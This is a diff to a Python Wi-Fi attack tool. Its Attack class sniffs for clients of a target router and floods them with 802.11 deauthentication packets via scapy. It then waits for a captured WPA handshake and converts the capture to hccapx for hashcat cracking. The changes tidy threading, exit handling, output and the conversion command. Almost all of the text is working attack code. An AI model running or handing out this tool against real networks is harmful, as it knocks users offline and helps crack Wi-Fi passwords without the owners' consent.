@@ -7,11 +7,12 @@ import subprocess
 from multiprocessing import Process
 from glob import glob
 from check_handshake import checkHandshake
-
+import signal
 
 class Attack(object):
 	"""docstring for Attack"""
-	def __init__(self, targetRouterMac,channel):
+	def __init__(self, targetRouterMac,channel,engine):
+		self.ENGINE = engine # main class for exiting the program
 		self.clients = []
 		self.interface = "wlan0mon"
 		self.targetRouterMac = targetRouterMac
@@ -23,50 +24,59 @@ class Attack(object):
 
 		# starting handshake verifier
 		self.verifier = RepeatTimer(1,self.verify_Handshake)
+		self.verifier.daemon = True
 		self.verifier.start()
 
 
 
 	def start(self):
 		t = AsyncSniffer(prn=self.find_clients, iface=self.interface)
+		# signal.signal(signal.SIGINT, self.keyboardInterruptHandler)
 		t.start()
 		self.search_client()
-
+		# self.convert_cap_hccap()
 		# if the above loop ended, then close everything
+		print("search client stopped")
 		self.hs.terminate() #terminate hash capture
 		self.hs.join()
 		self.verifier.cancel() # cancel handshake verifier
+		print("verifier stopped")
 		t.stop() # stop the deauther
-		raise KeyboardInterrupt
+		print("deauther stopped")
 
 
 	def search_client(self):
-		print(colors.O + "[-]" + colors.W +" Total clients: "+colors.GR+ str(len(self.clients)) + colors.W)
-		print(colors.O + "[+]" + colors.W + " Searching for clients...")
-		timeout = time.time() + 60*2
+		
+		try:
+			print(colors.O + "[+]" + colors.W + " Searching for clients...")
+			timeout = time.time() + 60*2
 
-		while self.hasHandshake == False and time.time() < timeout:
-			time.sleep(8)
-			if( len(self.clients) != 0 ):
-				print(colors.B + "[+]" + colors.W +" Found client ")
-				self.deauth_clients()
-				
-		if(self.hasHandshake):
-			print(colors.BOLD+colors.O + "[+]" + colors.W +colors.BOLD+" Captured handshake successfully!" + colors.W)
-			return ''
-		else:
-			print(colors.O + "[-]" + colors.W + " Timeout")
-			return ''
+			while self.hasHandshake == False and time.time() < timeout:
+				time.sleep(8)
+				if( len(self.clients) != 0 ):
+					print(colors.O + "[-]" + colors.W +" Total clients: "+colors.GR+ str(len(self.clients)) + colors.W)
+					self.deauth_clients()
+					
+			if(self.hasHandshake):
+				print(colors.BOLD+colors.O + "[+]" + colors.W +colors.BOLD+" Captured handshake successfully!" + colors.W)
+				self.ENGINE.exit()
+			else:
+				print(colors.O + "[-]" + colors.W + " Timeout")
+		except KeyboardInterrupt:
+			pass
 
 
 
 	def deauth_clients(self):
 	
 		if(len(self.clients) != 0):
-			print(colors.O + "[+]" + colors.W + " Sending Deauth packet to: ", end=' ')
+			
 			for i in self.clients:
-				print(colors.BOLD+colors.GR + str(i).upper() + colors.W,end=" ")
+				client = colors.BOLD+colors.GR + str(i).upper() + colors.W
+				print(colors.O + "[+]" + colors.W + f" Sending Deauth packet to: {client}")
+				print("")
 				self.deauth(i)
+				time.sleep(0.2)
 	
 
 	def deauth(self,client):
@@ -78,7 +88,7 @@ class Attack(object):
                addr3=self.targetRouterMac) / \
          Dot11Deauth(reason=7) 
          # sending the deauth packet
-		sendp(packet, iface=self.interface,count=5)
+		sendp(packet, iface=self.interface,count=5,verbose=False)
 		
 	
 
@@ -107,20 +117,22 @@ class Attack(object):
 			v = checkHandshake(os.path.join(self.dir,file))
 			self.hasHandshake = v.verify()
 			if(self.hasHandshake):
-				time.sleep(1)
-				self.convert_cap_hccap()
+				self.verifier.cancel()
+				
 
 
 	def convert_cap_hccap(self):
 		# hashcat is much faster for cracking
 		try:
 			file = glob("capture*.cap")[0]
-			cmd = f"aircrack-ng -J {self.targetRouterMac}_hs {os.path.join(self.dir,file)}"
-			print(colors.O + "[+]" + colors.W + " Coverting pcap to hccap for cracking.")
+			cmd = f"cap2hccapx.bin {os.path.join(self.dir,file)} {self.targetRouterMac}_hs.hccapx"
+			print(colors.O + "[+]" + colors.W + " Coverting pcap to hccapx for cracking.")
 			subprocess.call(cmd,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
-			print(colors.O + "[+]" + colors.W + f" Saved to {self.targetRouterMac}_hs.hccap")
+			print(colors.O + "[+]" + colors.W + f" Saved to {self.targetRouterMac}_hs.hccapx")
 		except:
 			pass
+
+
 
 
 
